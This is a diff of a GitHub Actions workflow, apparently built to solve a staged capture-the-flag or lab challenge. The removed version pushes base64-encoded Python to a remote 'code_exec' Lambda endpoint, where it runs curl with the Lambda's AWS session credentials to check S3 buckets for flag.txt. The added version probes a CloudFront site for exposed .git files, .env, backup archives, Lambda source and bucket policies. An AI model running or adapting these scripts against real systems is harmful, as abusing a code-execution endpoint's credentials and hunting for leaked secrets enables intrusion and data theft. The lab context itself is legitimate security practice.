@@ -1,4 +1,4 @@
-name: Stage2-03-Curl-S3-Probe
+name: Stage2-04-Public-Artifact-Probe
 
 on:
   push:
@@ -12,94 +12,50 @@ jobs:
   probe:
     runs-on: ubuntu-latest
 
-    env:
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
-      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
-
     steps:
-      - name: Install dependencies
+      - name: Probe public site paths
         run: |
-          python3 -m pip install requests requests-aws4auth --quiet
+          set +e
 
-      - name: Probe S3 using Lambda curl
-        run: |
-          python3 - <<'PY'
-          import os
-          import base64
-          import requests
-          from requests_aws4auth import AWS4Auth
+          BASE="https://d4ysu55xg7wfi.cloudfront.net"
 
-          auth = AWS4Auth(
-              os.environ["AWS_ACCESS_KEY_ID"],
-              os.environ["AWS_SECRET_ACCESS_KEY"],
-              "us-east-1",
-              "execute-api",
-              session_token=os.environ["AWS_SESSION_TOKEN"]
-          )
+          paths="
+          /
+          /index.html
+          /docs.html
+          /robots.txt
+          /sitemap.xml
+          /.git/
+          /.git/HEAD
+          /.git/config
+          /.git/index
+          /.git/description
+          /.git/logs/HEAD
+          /.env
+          /flag.txt
+          /backup.zip
+          /site.zip
+          /source.zip
+          /lambda_function.py
+          /bucket_policy.json
+          /policy.json
+          "
 
-          tests = [
-              ("userad88e2b168aa387e", "flag.txt"),
-              ("userad88e2b168aa387e", "index.html"),
-              ("userad88e2b168aa387e", "docs.html"),
-              ("logad88e2b168aa387e", "flag.txt"),
-              ("logad88e2b168aa387e", "index.html"),
-              ("logad88e2b168aa387e", "docs.html")
-          ]
+          while IFS= read -r path; do
+            [ -z "$path" ] && continue
 
-          for bucket, key in tests:
-              code = f'''
-          import os
-          import subprocess
+            echo "===== $path ====="
 
-          url = "https://s3.us-east-1.amazonaws.com/{bucket}/{key}"
+            curl \
+              --silent \
+              --show-error \
+              --location \
+              --max-time 15 \
+              --output /tmp/probe_body \
+              --write-out "HTTP=%{http_code} SIZE=%{size_download} TYPE=%{content_type}\n" \
+              "$BASE$path"
 
-          command = [
-              "curl",
-              "--silent",
-              "--show-error",
-              "--head",
-              "--aws-sigv4",
-              "aws:amz:us-east-1:s3",
-              "--user",
-              os.environ["AWS_ACCESS_KEY_ID"] + ":" + os.environ["AWS_SECRET_ACCESS_KEY"],
-              "-H",
-              "x-amz-security-token: " + os.environ["AWS_SESSION_TOKEN"],
-              url
-          ]
-
-          result = subprocess.run(
-              command,
-              stdout=subprocess.PIPE,
-              stderr=subprocess.PIPE,
-              text=True
-          )
-
-          output = result.stdout + result.stderr
-
-          if " 200 " in output or " 206 " in output:
-              raise SystemExit(7)
-
-          if " 403 " in output or "AccessDenied" in output:
-              raise SystemExit(10)
-
-          if " 404 " in output or "NoSuchKey" in output:
-              raise SystemExit(12)
-
-          raise SystemExit(19)
-          '''
-
-              encoded = base64.b64encode(code.encode()).decode()
-
-              response = requests.post(
-                  os.environ["API_URL"],
-                  json={"code": encoded},
-                  auth=auth,
-                  timeout=40
-              )
-
-              print(f"BUCKET={bucket} KEY={key}")
-              print(response.text)
-              print("---")
-          PY
+            head -c 300 /tmp/probe_body
+            echo
+            echo
+          done <<< "$paths"
